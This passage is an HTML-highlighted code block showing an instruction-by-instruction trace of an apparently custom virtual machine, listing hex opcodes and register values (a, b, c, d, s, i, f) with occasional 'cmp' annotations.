class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20402</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">2</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x801004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">3</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204c2</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">4</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">5</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:c2 s:<span class="hljs-number">0</span> i:<span class="hljs-number">6</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2044d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>c d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">7</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">8</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">4</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">9</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20442</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">42</span> s:<span class="hljs-number">0</span> i:c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20482</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>e d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2206f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">82</span> s:<span class="hljs-number">0</span> i:f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2042d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>f d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">10</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22070</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">11</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:<span class="hljs-number">2</span>d s:<span class="hljs-number">0</span> i:<span class="hljs-number">12</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204e5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">70</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">13</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22071</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">14</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:e5 s:<span class="hljs-number">0</span> i:<span class="hljs-number">15</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20464</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">71</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">16</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22072</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">17</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">64</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">18</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20498</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">72</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">19</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22073</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:<span class="hljs-number">98</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204f7</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">73</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22074</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:f7 s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204ac</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">74</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">1</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22075</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">20</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:ac s:<span class="hljs-number">0</span> i:<span class="hljs-number">21</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20465</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">75</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">22</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22076</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">23</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x402004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">24</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21024</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">25</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">1</span> i:<span class="hljs-number">26</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">2</span> i:<span class="hljs-number">27</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">28</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">29</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">65</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2044b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">4</span> i:<span class="hljs-number">2</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20445</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">45</span> s:<span class="hljs-number">4</span> i:<span class="hljs-number">2</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">45</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">2</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20459</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">59</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">2</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">59</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">30</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2043a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">3</span>a s:<span class="hljs-number">6</span> i:<span class="hljs-number">31</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">3</span>a s:<span class="hljs-number">7</span> i:<span class="hljs-number">32</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20420</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">33</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">76</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">34</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22005</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">35</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">20</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">36</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">5</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">37</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">38</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">39</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">3</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">3</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">3</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2200b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">30</span> c:b d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:b d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">40</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100404</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:b d:b s:<span class="hljs-number">8</span> i:<span class="hljs-number">41</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">42</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">43</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">44</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21044</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">45</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">46</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">47</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">8</span> i:<span class="hljs-number">48</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">49</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">4</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">4</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x210ce</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:cf f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20230</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:d0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2406e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:d1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22009</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:b s:<span class="hljs-number">5</span> i:d2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20402</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">5</span> i:d3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10410</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">5</span> i:d4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:d5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2109b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10220</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204ff</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10204</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">7</span> i:a2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x80202</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">65</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x200240</span># cmp<br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">65</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a6 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">7</span> i:a7 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a8 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x204af</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:af s:<span class="hljs-number">6</span> i:a9 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x40804</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:af s:<span class="hljs-number">6</span> i:b0 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x800420</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">6</span> i:b1 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x801000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d6 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x22000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d7 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x200420</span># cmp<br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">5</span> i:d9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x40404</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>b 